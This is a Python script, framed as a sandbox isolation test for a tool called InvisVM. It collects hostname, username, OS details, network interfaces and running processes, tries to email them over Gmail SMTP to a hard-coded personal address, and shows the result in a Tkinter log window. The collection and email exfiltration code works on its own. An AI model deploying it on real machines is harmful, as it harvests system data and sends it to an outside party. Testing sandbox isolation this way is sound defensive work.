#!/usr/bin/env python3

"""
System Information Exfiltration Script - WITH PROFESSIONAL LOG VIEWER GUI
FOR SECURITY TESTING PURPOSES ONLY

UI IMPROVEMENTS:
- 20pt font (larger, more readable)
- FIXED: Scrolling now allows viewing old logs
- Clearer emoji visibility 
- Professional modern styling
- Enhanced header design
- Better color contrast
- Improved spacing and padding
"""

import sys
import signal
import tkinter as tk
from tkinter import scrolledtext
import threading
import time
import os


# Setup signal handler
def signal_handler(signum, frame):
    print("\n✅ Script caught termination signal - exiting gracefully")
    sys.exit(0)


signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)


try:
    import smtplib
    import platform
    import socket
    import os
    import subprocess
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    import logging
except ImportError as e:
    print(f"❌ Import error: {e}")
    print("✅ SANDBOX WORKING - Module import restricted")
    sys.exit(0)


# Setup logging with error handling
try:
    logging.basicConfig(
        filename='/tmp/exfil_log.txt',
        level=logging.DEBUG,
        format='[%(asctime)s] %(levelname)s - %(message)s'
    )
except Exception as e:
    pass


# Global list to store all log messages
log_messages = []
last_log_count = 0  # Track how many logs we've already added


def safe_log(message, level='info'):
    """Safe logging that never crashes AND collects messages for GUI"""
    global log_messages
    
    # Format the message
    timestamp = time.strftime('[%Y-%m-%d %H:%M:%S]')
    formatted_msg = f"{timestamp} {level.upper()}: {message}"
    
    # Add to global list for GUI display
    log_messages.append(formatted_msg)
    
    try:
        if level == 'info':
            logging.info(message)
        elif level == 'error':
            logging.error(message)
        elif level == 'warning':
            logging.warning(message)
    except:
        pass


def create_log_viewer_window(root_window, initial_message="Initializing..."):
    """Create a professional GUI window showing all logs"""
    global log_messages, last_log_count
    
    window = tk.Toplevel(root_window)
    window.title("InvisVM - Security Test Execution Monitor")
    window.geometry("1000x700")
    window.resizable(True, True)
    window.configure(bg="#0a0a0a")
    
    # Header frame with enhanced styling
    header_frame = tk.Frame(window, bg="#1a1a1a", height=90)
    header_frame.pack(side=tk.TOP, fill=tk.X)
    header_frame.pack_propagate(False)
    
    # Top divider
    divider_top = tk.Frame(header_frame, bg="#00ff00", height=3)
    divider_top.pack(side=tk.TOP, fill=tk.X)
    
    # Title label with larger font and better emoji spacing
    title_label = tk.Label(
        header_frame,
        text="🛡️  System Information Exfiltration Test - Live Execution Monitor",
        font=("Courier", 20, "bold"),
        bg="#1a1a1a",
        fg="#00ff00",
        pady=8
    )
    title_label.pack(side=tk.TOP)
    
    # Subtitle label with larger font
    subtitle_label = tk.Label(
        header_frame,
        text="Real-time monitoring of data exfiltration and network isolation effectiveness",
        font=("Courier", 11),
        bg="#1a1a1a",
        fg="#00ff00",
        pady=5
    )
    subtitle_label.pack(side=tk.TOP)
    
    # Bottom divider
    divider_bottom = tk.Frame(header_frame, bg="#00ff00", height=3)
    divider_bottom.pack(side=tk.TOP, fill=tk.X, pady=(5, 0))
    
    # Main container frame
    main_container = tk.Frame(window, bg="#0a0a0a")
    main_container.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)
    
    # Log display area with scrollbar - NOW 20PT FONT
    text_frame = tk.Frame(main_container, bg="#0a0a0a")
    text_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    
    log_text = scrolledtext.ScrolledText(
        text_frame,
        wrap=tk.WORD,
        font=("Courier", 20),  # INCREASED from 12 to 20pt
        bg="#0a0a0a",
        fg="#00ff00",
        insertbackground="#00ff00",
        relief=tk.FLAT,
        borderwidth=0,
        highlightthickness=1,
        highlightbackground="#00ff00",
        padx=12,
        pady=12,
        spacing1=4,
        spacing2=2,
        spacing3=4
    )
    log_text.pack(fill=tk.BOTH, expand=True)
    
    # Make text read-only
    log_text.config(state=tk.DISABLED)
    
    # Configure tags for different log levels with better contrast
    log_text.tag_config("INFO", foreground="#00ff00", font=("Courier", 20))
    log_text.tag_config("ERROR", foreground="#ff4444", font=("Courier", 20, "bold"))
    log_text.tag_config("WARNING", foreground="#ffff00", font=("Courier", 20))
    log_text.tag_config("SUCCESS", foreground="#00ff00", font=("Courier", 20))
    log_text.tag_config("BLOCKED", foreground="#00ff00", font=("Courier", 20))
    log_text.tag_config("FAILED", foreground="#ff4444", font=("Courier", 20, "bold"))
    log_text.tag_config("SEPARATOR", foreground="#00ff00", font=("Courier", 14))
    
    # Store previous scroll position
    scroll_position = [None]
    
    def update_log_display():
        """Update the log display with new messages - FIXED SCROLLING"""
        global last_log_count
        
        # Store current scroll position before updating
        current_scroll = log_text.yview()
        
        log_text.config(state=tk.NORMAL)
        
        # Only append new logs instead of clearing everything
        if last_log_count == 0:
            # First time: add header
            log_text.delete('1.0', tk.END)
            log_text.insert(tk.END, "═" * 95 + "\n", "SEPARATOR")
            log_text.insert(tk.END, "EXFILTRATION TEST EXECUTION LOG\n", "INFO")
            log_text.insert(tk.END, "═" * 95 + "\n\n", "SEPARATOR")
        
        # Add only new logs since last update
        if len(log_messages) > last_log_count:
            for msg in log_messages[last_log_count:]:
                # Determine tag based on message content
                if "ERROR" in msg.upper() or "FAILED" in msg.upper():
                    tag = "ERROR"
                elif "WARNING" in msg.upper():
                    tag = "WARNING"
                elif "BLOCKED" in msg.upper() or "✅" in msg:
                    tag = "BLOCKED"
                elif "❌" in msg:
                    tag = "FAILED"
                elif "SUCCESS" in msg.upper():
                    tag = "SUCCESS"
                else:
                    tag = "INFO"
                
                log_text.insert(tk.END, msg + "\n", tag)
            
            last_log_count = len(log_messages)
        
        # Scroll to bottom only if user was already at bottom
        # This preserves user's scroll position when they scroll up
        current_yview = log_text.yview()
        if current_yview[1] >= 0.95:  # If user is near bottom (95%+)
            log_text.see(tk.END)  # Auto-scroll to bottom
        
        log_text.config(state=tk.DISABLED)
        
        # Schedule next update
        window.after(500, update_log_display)
    
    # Status bar at bottom with enhanced styling
    status_frame = tk.Frame(window, bg="#1a1a1a", height=50)
    status_frame.pack(side=tk.BOTTOM, fill=tk.X)
    status_frame.pack_propagate(False)
    
    # Top divider for status
    divider_status_top = tk.Frame(status_frame, bg="#00ff00", height=2)
    divider_status_top.pack(side=tk.TOP, fill=tk.X)
    
    status_label = tk.Label(
        status_frame,
        text="⚡ Status: Running... | Executing security test in real-time",
        font=("Courier", 11, "bold"),
        bg="#1a1a1a",
        fg="#00ff00",
        pady=10
    )
    status_label.pack(side=tk.TOP)
    
    # Start updating
    update_log_display()
    
    return window


def collect_system_info():
    """Collect system information - guaranteed not to crash"""
    safe_log("Starting system information collection...")
    info = {}
    
    try:
        info['Hostname'] = socket.gethostname()
    except:
        info['Hostname'] = 'Unable to retrieve'
    
    try:
        info['Username'] = os.getenv('USER', 'unknown')
    except:
        info['Username'] = 'Unable to retrieve'
    
    try:
        info['OS'] = platform.system()
    except:
        info['OS'] = 'Unable to retrieve'
    
    try:
        info['OS Version'] = platform.release()
    except:
        info['OS Version'] = 'Unable to retrieve'
    
    try:
        info['OS Kernel'] = platform.version()
    except:
        info['OS Kernel'] = 'Unable to retrieve'
    
    try:
        info['Architecture'] = platform.machine()
    except:
        info['Architecture'] = 'Unable to retrieve'
    
    try:
        info['Processor'] = platform.processor()
    except:
        info['Processor'] = 'Unable to retrieve'
    
    try:
        info['Python Version'] = platform.python_version()
    except:
        info['Python Version'] = 'Unable to retrieve'
    
    try:
        result = subprocess.run(
            ['ip', 'addr'],
            capture_output=True,
            text=True,
            timeout=5,
            check=False
        )
        info['Network Interfaces'] = result.stdout[:500] if result.stdout else 'Unable to retrieve'
    except:
        info['Network Interfaces'] = 'Unable to retrieve'
    
    try:
        result = subprocess.run(
            ['ps', 'aux'],
            capture_output=True,
            text=True,
            timeout=5,
            check=False
        )
        if result.stdout:
            processes = result.stdout.split('\n')[:20]
            info['Running Processes'] = '\n'.join(processes)
        else:
            info['Running Processes'] = 'Unable to retrieve'
    except:
        info['Running Processes'] = 'Unable to retrieve'
    
    safe_log("System information collected successfully")
    return info


def send_exfil_email(recipient_email, system_info):
    """Send system information via email - BULLETPROOF"""
    safe_log(f"Attempting to send email to {recipient_email}...")
    
    try:
        socket.setdefaulttimeout(10)
    except:
        pass
    
    try:
        # Gmail SMTP configuration
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
        sender_email = ''
        sender_password = ''
        
        # Create message
        try:
            message = MIMEMultipart()
            message['From'] = sender_email
            message['To'] = recipient_email
            message['Subject'] = '[SECURITY TEST] System Information Collected'
            
            info_text = "SYSTEM INFORMATION EXFILTRATION TEST\n"
            info_text += "="*50 + "\n\n"
            for key, value in system_info.items():
                try:
                    info_text += f"{key}: {value}\n"
                except:
                    info_text += f"{key}: [Error formatting value]\n"
            info_text += "\n" + "="*50
            info_text += "\n[This is a controlled security test]\n"
            message.attach(MIMEText(info_text, 'plain'))
        except Exception as e:
            safe_log(f"Error creating email message: {e}", 'error')
            return False
        
        # Attempt connection
        try:
            safe_log(f"Connecting to {smtp_server}:{smtp_port}...")
            server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
        except socket.gaierror as e:
            safe_log(f"DNS resolution failed: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - DNS resolution failed (SANDBOX WORKING!)", 'error')
            return False
        except socket.timeout as e:
            safe_log(f"Connection timeout: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - Connection timeout (SANDBOX WORKING!)", 'error')
            return False
        except ConnectionRefusedError as e:
            safe_log(f"Connection refused: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - Connection refused (SANDBOX WORKING!)", 'error')
            return False
        except OSError as e:
            safe_log(f"Network OS Error: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - Network error (SANDBOX WORKING!)", 'error')
            return False
        except Exception as e:
            safe_log(f"Connection error: {type(e).__name__}: {e}", 'error')
            safe_log(f"RESULT: Email exfiltration BLOCKED - {type(e).__name__} (SANDBOX WORKING!)", 'error')
            return False
        
        # Attempt STARTTLS
        try:
            safe_log("Starting TLS...")
            server.starttls()
        except Exception as e:
            safe_log(f"TLS error: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - TLS failed (SANDBOX WORKING!)", 'error')
            try:
                server.quit()
            except:
                pass
            return False
        
        # Attempt login
        try:
            safe_log("Logging in...")
            server.login(sender_email, sender_password)
        except smtplib.SMTPAuthenticationError as e:
            safe_log(f"Authentication failed: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - Authentication failed", 'error')
            try:
                server.quit()
            except:
                pass
            return False
        except Exception as e:
            safe_log(f"Login error: {e}", 'error')
            safe_log(f"RESULT: Email exfiltration BLOCKED - Login failed", 'error')
            try:
                server.quit()
            except:
                pass
            return False
        
        # Attempt to send
        try:
            safe_log("Sending email...")
            server.send_message(message)
            server.quit()
            safe_log("⚠️ EMAIL SENT SUCCESSFULLY!", 'error')
            safe_log("RESULT: Email exfiltration SUCCEEDED - SANDBOX FAILED!", 'error')
            return True
        except smtplib.SMTPException as e:
            safe_log(f"SMTP send error: {e}", 'error')
            safe_log("RESULT: Email exfiltration BLOCKED - SMTP error", 'error')
            try:
                server.quit()
            except:
                pass
            return False
        except Exception as e:
            safe_log(f"Send error: {e}", 'error')
            safe_log(f"RESULT: Email exfiltration BLOCKED - {type(e).__name__}", 'error')
            try:
                server.quit()
            except:
                pass
            return False
    
    except Exception as e:
        safe_log(f"Unexpected error in email function: {type(e).__name__}: {e}", 'error')
        safe_log(f"RESULT: Email exfiltration BLOCKED - Unexpected error", 'error')
        return False


def main():
    """Main execution with GUI log viewer"""
    
    # Create root window (hidden)
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    
    # Create and show log viewer window
    log_window = create_log_viewer_window(root, "Initializing Exfiltration Test...")
    
    # Function to run test in background thread
    def run_test():
        safe_log("=" * 90)
        safe_log("SECURITY TEST: System Information Exfiltration")
        safe_log("=" * 90)
        
        recipient_email = 'rachitsharma.iitjee@gmail.com'
        safe_log(f"Target: {recipient_email}")
        safe_log("Collecting system information...")
        
        try:
            system_info = collect_system_info()
            safe_log(f"Collected {len(system_info)} pieces of information")
        except Exception as e:
            safe_log(f"Error collecting info: {e}", 'error')
            system_info = {'Error': 'Collection failed'}
        
        safe_log("Attempting to exfiltrate via email...")
        safe_log("Testing network isolation...")
        
        try:
            success = send_exfil_email(recipient_email, system_info)
        except Exception as e:
            safe_log(f"Top-level exception caught: {type(e).__name__}", 'error')
            success = False
        
        # Final verdict
        safe_log("=" * 90)
        if success:
            safe_log("❌ TEST RESULT: FAILED", 'error')
            safe_log("❌ Data was successfully exfiltrated!", 'error')
            safe_log("❌ Sandbox did NOT block network access!", 'error')
        else:
            safe_log("✅ TEST RESULT: PASSED")
            safe_log("✅ Data exfiltration was blocked!")
            safe_log("✅ Sandbox successfully isolated network!")
        safe_log("=" * 90)
        safe_log("Script execution completed successfully")
    
    # Run test in background thread
    test_thread = threading.Thread(target=run_test, daemon=True)
    test_thread.start()
    
    # Start GUI event loop
    root.mainloop()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        safe_log("Script interrupted by user (Ctrl+C)", 'warning')
        sys.exit(0)
    except SystemExit:
        pass
    except Exception as e:
        safe_log(f"Fatal exception caught and handled: {type(e).__name__}: {e}", 'error')
        sys.exit(0)
    finally:
        try:
            sys.stdout.flush()
            sys.stderr.flush()
        except:
            pass
